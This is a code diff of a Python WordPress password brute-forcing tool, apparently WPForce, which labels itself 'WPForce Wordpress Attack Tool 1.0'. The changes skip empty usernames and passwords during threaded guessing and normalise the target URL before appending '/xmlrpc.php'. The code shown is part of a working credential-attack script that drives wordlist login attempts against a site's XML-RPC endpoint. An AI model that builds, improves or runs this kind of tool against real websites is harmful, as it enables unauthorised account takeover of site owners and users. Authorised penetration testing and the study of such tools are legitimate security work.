@@ -4,7 +4,7 @@ import socket
 import urllib2
 import argparse
 import threading
-__author__ = 'n00py)'
+__author__ = 'n00py'
 # These variables must be shared by all threads dynamically
 correct_pairs = {}
 total = 0
@@ -58,7 +58,9 @@ def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
             user = userlist[current_user]
             password = wordlist[current_pass]
             if user not in correct_pairs:
-                PasswordAttempt(user,password,url,thread_no,verbose,debug,agent)
+                if user != "":
+                    if password != "":
+                        PasswordAttempt(user,password,url,thread_no,verbose,debug,agent)
         total += 1
 
 
@@ -183,7 +185,10 @@ def main():
     parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
     parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
     args = parser.parse_args()
-    url = args.url + '/xmlrpc.php'
+    url = args.url
+    if url.endswith('/'):
+        url = url[:-1]
+    url += '/xmlrpc.php'
     u = open(args.input, 'r')
     userlist = u.read().split('\n')
     totalusers = len(userlist)
